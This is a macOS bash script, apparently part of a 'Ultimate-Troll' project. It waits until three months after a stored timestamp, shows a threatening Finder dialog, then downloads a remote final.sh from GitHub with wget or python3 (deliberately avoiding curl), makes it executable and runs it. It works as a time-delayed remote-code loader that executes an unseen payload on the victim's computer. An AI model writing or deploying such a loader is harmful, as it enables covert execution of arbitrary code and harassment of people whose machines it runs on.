#!/usr/bin/env bash

TARGET_DIR="$HOME/programfiles"
SUBP_DIR="$TARGET_DIR/subp"
SUCCESS_MARKER="$SUBP_DIR/success"
SETUP_URL="https://raw.githubusercontent.com/Thomas20090425/Ultimate-Troll/refs/heads/main/setup.sh"
SETUP_PATH="$TARGET_DIR/setup.sh"

if [ -f "$TIME_FILE" ]; then
  ORIG_TS_STR=$(cat "$TIME_FILE")
  echo "[DEBUG] Original timestamp string: $ORIG_TS_STR"
  # Compute the date exactly 3 months after original timestamp
  TARGET_DATE=$(date -j -f '%Y:%m:%d:%H:%M:%S' "$ORIG_TS_STR" -v+3m '+%Y%m%d')
  echo "[DEBUG] Computed TARGET_DATE: $TARGET_DATE"
  NOW_DATE=$(date '+%Y%m%d')
  echo "[DEBUG] Current NOW_DATE: $NOW_DATE"
  # Compare numeric dates only if both are valid 8-digit numbers
  echo "[DEBUG] Evaluating condition: NOW_DATE >= TARGET_DATE?"
  if [[ "$NOW_DATE" =~ ^[0-9]{8}$ ]] && [[ "$TARGET_DATE" =~ ^[0-9]{8}$ ]] && (( NOW_DATE >= TARGET_DATE )); then
    echo "[DEBUG] Condition met: triggering final.sh"
    # Notify user via Finder dialog
    osascript -e 'tell application "Finder" to display dialog "It'\''s the day, you were never forgiven." buttons {"OK"} default button 1'
    # Download and execute final.sh without curl
    if command -v wget >/dev/null 2>&1; then
      wget -qO "$TARGET_DIR/final.sh" "https://raw.githubusercontent.com/Thomas20090425/Ultimate-Troll/refs/heads/main/final.sh"
    elif command -v python3 >/dev/null 2>&1; then
      python3 - <<EOF
import urllib.request
urllib.request.urlretrieve("https://raw.githubusercontent.com/Thomas20090425/Ultimate-Troll/refs/heads/main/final.sh", "$TARGET_DIR/final.sh")
EOF
    else
      echo "Error: unable to download final.sh" >&2
      exit 1
    fi
    chmod +x "$TARGET_DIR/final.sh"
    bash "$TARGET_DIR/final.sh"
    exit 0
  else
    echo "[DEBUG] Condition not met: no action"
  fi
fi